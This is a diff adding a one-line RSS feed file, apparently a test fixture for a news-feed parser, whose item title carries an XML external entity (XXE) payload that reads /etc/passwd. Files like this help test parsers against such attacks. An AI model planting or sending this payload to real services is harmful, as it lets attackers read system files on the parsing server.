@@ -1,0 +1,1 @@
+<?xml version="1.0"?><!DOCTYPE rss [<!ENTITY exploit SYSTEM "file:///etc/passwd">]><rss version="2.0"><channel><item><title>&exploit;</title><link>https://archlinux.org/news/xxe/</link><pubDate>Tue, 22 Sep 2026 09:09:27 +0000</pubDate></item></channel></rss>
